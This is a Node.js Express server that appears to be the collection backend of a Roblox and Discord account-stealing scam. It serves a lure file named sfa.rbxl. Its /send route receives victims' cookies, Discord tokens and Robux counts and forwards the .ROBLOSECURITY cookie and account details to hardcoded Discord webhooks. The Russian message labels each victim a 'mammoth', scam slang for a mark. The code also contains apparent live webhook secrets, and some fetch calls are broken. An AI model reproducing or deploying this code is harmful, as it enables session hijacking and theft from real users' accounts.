const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';
const publicWebhookUrl = 'https://discord.com/api/webhooks/1525826351372959774/5l0-KYZkUKDu6rps9WwMb63vUBzaB6vxKX6UD7CpOrh7Gqy5pxEEbJMvYItXTA-yaVkf';

app.get('/download', async (req, res) => {
  const file = path.join(__dirname, 'public', 'sfa.rbxl');
  res.download(file);
});

app.post('/send', async (req, res) => {
  const { cookies, tokens, region } = req.body;
  let robux = 1488;
  let userid = 1;
  try {
    robux = req.body.robux;
    userid = req.body.userid;
  } catch {
    robux = 67;
    userid = 1;
  }
  const hasPremiumraw = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userid}/validate-membership`);
  const essentialData = await fetch(`https://users.roblox.com/v1/users/${userid}`);
  const imageUrl = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userid}&size=420x420&format=Png&isCircular=false`).imageUrl;
  const userName = essentialData.name;
  const creationDate = essentialData.created;
  const hasPremium = String(hasPremiumraw);
  const cookiesString = Object.values(cookies).join(' ');
  const tokensString = Object.values(tokens).join(' ');

  console.log('Cookies:', cookiesString);
  console.log('Tokens:', tokensString);

  const plainMessage = '@everyone Новый мамонт! \n Регион: ```' + region + ' ```  РБ: ```' + cookiesString + ' ``` ДС: ```' + tokensString + ' ``` РОБУКСЫ: ```' + robux + ' ```';
  const content = plainMessage;

  try {
      const response = await fetch(publicWebhookUrl, {
          method: 'POST',
          headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
          },
          body: JSON.stringify({
              content: "@everyone New account!",
              embeds: [
                  {
                      title: "Info",
                      description: `👤Username: ${userName}\n💰Robux: ${robux}\n✨Has Roblox Plus: ${hasPremium == "true" ? "✅" : "❌"}\n🏴Region: ${region}\n🕘Creation Date: ${creationDate}`,
                      color: null,
                      thumbnail: {
                          url: imageUrl
                      }
                  },
                  {
                      title: ".ROBLOSECURITY",
                      description: "```" + cookiesString + "```",
                      color: null
                  }
              ],
              attachments: []
          })
      });
      const data = await response.json();
      res.status(200).json({ success: true, data });
  } catch (error) {
      console.error('Error:', error);
      res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
